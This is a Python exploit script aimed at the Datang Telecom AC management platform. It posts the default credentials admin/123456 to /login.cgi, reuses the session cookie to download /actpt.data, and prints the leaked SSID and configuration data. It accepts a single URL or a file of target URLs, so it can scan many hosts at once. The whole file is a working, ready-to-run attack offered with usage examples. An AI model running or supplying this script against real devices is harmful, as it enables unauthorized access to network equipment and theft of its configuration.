# -*- coding: utf-8 -*-
import argparse
import requests

headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }
poc = '/login.cgi'
poc1 = '/actpt.data'
data ='user=admin&password1=%E8%AF%B7%E8%BE%93%E5%85%A5%E5%AF%86%E7%A0%81&password=123456&Submit=%E7%AB%8B%E5%8D%B3%E7%99%BB%E5%BD%95'

def check(url):
    try:
        reps = requests.post(url=url+poc, headers=headers, data=data, verify=False, timeout=5)
        auth_s = str(reps.cookies.values()).replace("[", "").replace("]", "").replace("'", "")
        headers1 = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36",
            "Cookie": f"ac_userid={auth_s}"
        }
        repss = requests.get(url=url+poc1, headers=headers1, verify=False, timeout=5)
        if "ssid" in repss.text and repss.status_code == 200:
            print(f"[+] 存在大唐电信AC管理平台弱口令登录及信息泄露 url : {url}")
            print(f"Response_Text : {repss.text}")

    except Exception as e:
        print(f"ERROR : {e}")


def main():
    parser = argparse.ArgumentParser(description='A simple script to demonstrate argparse.')
    parser.add_argument('-u', '--url', type=str, help='URL to process')
    parser.add_argument('-f', '--file', type=str, help='File path to process')

    args = parser.parse_args()
    if args.url:
        check(args.url)

    elif args.file:
        with open(args.file, 'r') as file:
            lines = file.readlines()
            for line in lines:
                check(line.strip())

    else:
        print("eg : python3 大唐电信AC管理平台弱口令登录及信息泄露.py -u http://xx.xx.x.x")
        print("eg : python3 大唐电信AC管理平台弱口令登录及信息泄露.py -f 123.txt")

if __name__ == '__main__':
    main()


